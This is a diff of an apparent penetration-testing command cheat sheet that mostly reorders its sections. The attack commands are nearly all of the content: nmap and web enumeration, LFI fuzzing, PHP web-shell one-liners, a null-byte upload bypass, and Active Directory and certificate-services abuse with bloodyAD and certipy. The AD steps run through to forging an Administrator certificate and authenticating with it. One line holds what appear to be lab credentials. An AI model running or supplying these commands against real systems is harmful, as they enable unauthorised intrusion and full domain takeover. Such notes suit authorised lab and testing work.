@@ -59,11 +59,6 @@ sudo systemctl restart NetworkManager.service
 sudo systemctl restart networking.service
 
 # Discovery
-## Nessus scan
-systemctl status nessusd
-systemctl start nessusd
-chromium "https://localhost:8834"
-
 ## External scans
 (sudo nmap -Pn -n -sS "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_1000_$TARGET' &)
 (sudo nmap -Pn -n -sU "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_1000_$TARGET' &)
@@ -78,16 +73,32 @@ nbtscan-unixwiz 10.0.5.0/24 -m -n -w 0 | sort -k2
 netdiscover
 
 # Information Gathering
-## Scan specified ports
+## Nessus
+systemctl status nessusd
+systemctl start nessusd
+chromium "https://localhost:8834"
+
+## Nmap
 (PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_TCP_$TARGET' &)
 (PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_TCP_$TARGET' &)
 (PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_TCP_$TARGET' &)
-
-(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV --script vulners --script-args mincvss=9 "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 | grep -vE '0.0|/cve/|/githubexploit/|/packetstorm/|/cnvd/|/httpd/|/zdt/' | tee 'vulners_$TARGET' &)
-
 (PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_UDP_$TARGET' &)
 (PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_UDP_$TARGET' &)
 (PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_UDP_$TARGET' &)
+(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV --script vulners --script-args mincvss=9 "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 | grep -vE '0.0|/cve/|/githubexploit/|/packetstorm/|/cnvd/|/httpd/|/zdt/' | tee 'vulners_$TARGET' &)
+
+## Web
+[*] Technologies
+whatweb http://$TARGET
+wafw00f http://$TARGET
+
+[*] Directories
+dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,403,404 --exclude-sizes 12B
+
+[*] Subdomains
+gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
+-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
 
 
 
@@ -122,17 +133,6 @@ cat *VULN*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|sh
 cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|unrecognized|report any|\(\)|SF-|SF:' | sed 's/Nmap scan/\nNmap scan/g'
 
 ## Web
-[*] Technology / WAF
-whatweb http://$TARGET
-wafw00f http://$TARGET
-
-[*] Directory
-dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,403,404
-
-[*] Subdomain
-gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
--w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
-
 [*] WordPress
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
@@ -191,7 +191,7 @@ shell%2Ephar%00.png
 <?php system($_GET['cmd']); ?>
 <?php passthru($_REQUEST['cmd']); ?>
 
-[*] Traversal
+[*] Path Traversal
 ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 
@@ -500,13 +500,14 @@ dig axfr @$TARGET $DOM
 finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
-[*] AD
-+---------- Active Directory Attacks ----------+
+[*] Active Directory
++---------- Add User to Group ----------+
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
+
++---------- Get msDS-ManagedPassword ----------+
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
 
-[*] ADCS
-+---------- AD Certificate Services Attacks ----------+
++---------- Certificate Services Attacks ----------+
 chromium http://$TARGET/certsrv
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
@@ -521,11 +522,10 @@ certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabl
 certipy-ad req -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -debug -dynamic-endpoint
 certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
 
-+---------- Export PFX ----------+
-certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
-
 +---------- Forge Certificate ----------+
-certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@EXAMPLE.LOCAL -subject 'CN=ADMINISTRATOR,CN=USERS,DC=EXAMPLE,DC=LOCAL'
+certutil -store my
+certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
+certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=EXAMPLE,DC=LOCAL'
 
 +---------- Authenticate Certificate ----------+
 certipy auth -dc-ip $TARGET -pfx 'administrator_forged.pfx'
